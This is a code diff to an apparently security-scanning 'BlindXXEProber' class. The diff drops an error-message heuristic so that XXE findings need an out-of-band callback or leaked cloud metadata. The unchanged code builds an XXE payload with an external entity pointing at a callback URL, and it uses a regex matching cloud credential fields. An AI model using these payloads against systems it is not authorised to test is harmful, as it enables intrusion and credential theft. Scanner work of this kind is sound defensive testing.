@@ -33,7 +33,6 @@ const XML_PROBE_PATHS = [
 
 const BENIGN_XML = '<?xml version="1.0"?><test>hello</test>';
 
-const ERROR_PATTERNS = /entity|doctype|dtd|xml\s+pars/i;
 
 function buildOobDtdPayload(callbackUrl: string): string {
   return `<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${callbackUrl}">]>\n<root>&xxe;</root>`;
@@ -105,24 +104,14 @@ class BlindXXEProber {
       });
 
       const oobReceived = await callbackServer.waitForHit(beaconId, 10000);
-      const body = typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data);
-      const errorHeuristic = !oobReceived && ERROR_PATTERNS.test(body);
 
-      if (oobReceived || errorHeuristic) {
-        const severity = oobReceived ? "critical" : "high";
-        const detail = oobReceived
-          ? `OOB callback received for OOB DTD XXE at ${endpoint} (beacon: ${beaconId})`
-          : `Response error heuristic matched for OOB DTD XXE at ${endpoint} — possible blind XXE without OOB`;
-
-        logger.warn("[BlindXXEProber] XXE vuln detected (oob_dtd)", { endpoint, oobReceived, severity });
-
-        result.vulns.push({ endpoint, technique: "oob_dtd", beaconId, oobReceived, severity, detail });
-        result.hypotheses.push({
-          vulnClass: "xxe",
-          reasoning: detail,
-          confidence: oobReceived ? 0.9 : 0.6,
-          priority: oobReceived ? 10 : 8,
-        });
+      if (oobReceived) {
+        const detail = `OOB callback received for OOB DTD XXE at ${endpoint} (beacon: ${beaconId})`;
+        logger.warn("[BlindXXEProber] XXE vuln detected (oob_dtd)", { endpoint, oobReceived, severity: "critical" });
+        result.vulns.push({ endpoint, technique: "oob_dtd", beaconId, oobReceived, severity: "critical", detail });
+        result.hypotheses.push({ vulnClass: "xxe", reasoning: detail, confidence: 0.9, priority: 10 });
+      } else {
+        logger.debug("[BlindXXEProber] oob_dtd: no OOB callback", { endpoint });
       }
     } catch (err) {
       logger.debug("[BlindXXEProber] oob_dtd probe error", { endpoint, err: (err as Error).message });
@@ -146,24 +135,14 @@ class BlindXXEProber {
       });
 
       const oobReceived = await callbackServer.waitForHit(beaconId, 10000);
-      const body = typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data);
-      const errorHeuristic = !oobReceived && ERROR_PATTERNS.test(body);
 
-      if (oobReceived || errorHeuristic) {
-        const severity = oobReceived ? "critical" : "high";
-        const detail = oobReceived
-          ? `OOB callback received for parameter entity XXE at ${endpoint} (beacon: ${beaconId})`
-          : `Response error heuristic matched for parameter entity XXE at ${endpoint} — possible blind XXE without OOB`;
-
-        logger.warn("[BlindXXEProber] XXE vuln detected (parameter_entity)", { endpoint, oobReceived, severity });
-
-        result.vulns.push({ endpoint, technique: "parameter_entity", beaconId, oobReceived, severity, detail });
-        result.hypotheses.push({
-          vulnClass: "xxe",
-          reasoning: detail,
-          confidence: oobReceived ? 0.9 : 0.6,
-          priority: oobReceived ? 10 : 8,
-        });
+      if (oobReceived) {
+        const detail = `OOB callback received for parameter entity XXE at ${endpoint} (beacon: ${beaconId})`;
+        logger.warn("[BlindXXEProber] XXE vuln detected (parameter_entity)", { endpoint, oobReceived, severity: "critical" });
+        result.vulns.push({ endpoint, technique: "parameter_entity", beaconId, oobReceived, severity: "critical", detail });
+        result.hypotheses.push({ vulnClass: "xxe", reasoning: detail, confidence: 0.9, priority: 10 });
+      } else {
+        logger.debug("[BlindXXEProber] parameter_entity: no OOB callback", { endpoint });
       }
     } catch (err) {
       logger.debug("[BlindXXEProber] parameter_entity probe error", { endpoint, err: (err as Error).message });
@@ -189,26 +168,16 @@ class BlindXXEProber {
 
       const body = typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data);
 
-      // OOB is not applicable here; check response body for cloud metadata indicators or XML error
+      // OOB is not applicable here; require actual cloud metadata leakage in body
       const ssrfLeak = /ami-id|instance-id|security-credentials|computeMetadata|instanceId|publicIpv4|AccessKeyId|privateIpAddress/i.test(body);
-      const errorHeuristic = !ssrfLeak && ERROR_PATTERNS.test(body);
 
-      if (ssrfLeak || errorHeuristic) {
-        const severity = ssrfLeak ? "critical" : "high";
-        const oobReceived = ssrfLeak; // treat leaked metadata as "confirmed"
-        const detail = ssrfLeak
-          ? `Cloud metadata leaked via SSRF-via-XXE at ${endpoint} — instance metadata in response body`
-          : `Response error heuristic matched for SSRF-via-XXE at ${endpoint} — parser may be processing external entities`;
-
-        logger.warn("[BlindXXEProber] XXE vuln detected (ssrf_via_xxe)", { endpoint, ssrfLeak, severity });
-
-        result.vulns.push({ endpoint, technique: "ssrf_via_xxe", beaconId, oobReceived, severity, detail });
-        result.hypotheses.push({
-          vulnClass: "xxe",
-          reasoning: detail,
-          confidence: oobReceived ? 0.9 : 0.6,
-          priority: oobReceived ? 10 : 8,
-        });
+      if (ssrfLeak) {
+        const detail = `Cloud metadata leaked via SSRF-via-XXE at ${endpoint} — instance metadata in response body`;
+        logger.warn("[BlindXXEProber] XXE vuln detected (ssrf_via_xxe)", { endpoint, ssrfLeak, severity: "critical" });
+        result.vulns.push({ endpoint, technique: "ssrf_via_xxe", beaconId, oobReceived: true, severity: "critical", detail });
+        result.hypotheses.push({ vulnClass: "xxe", reasoning: detail, confidence: 0.9, priority: 10 });
+      } else {
+        logger.debug("[BlindXXEProber] ssrf_via_xxe: no metadata leak", { endpoint });
       }
     } catch (err) {
       logger.debug("[BlindXXEProber] ssrf_via_xxe probe error", { endpoint, err: (err as Error).message });
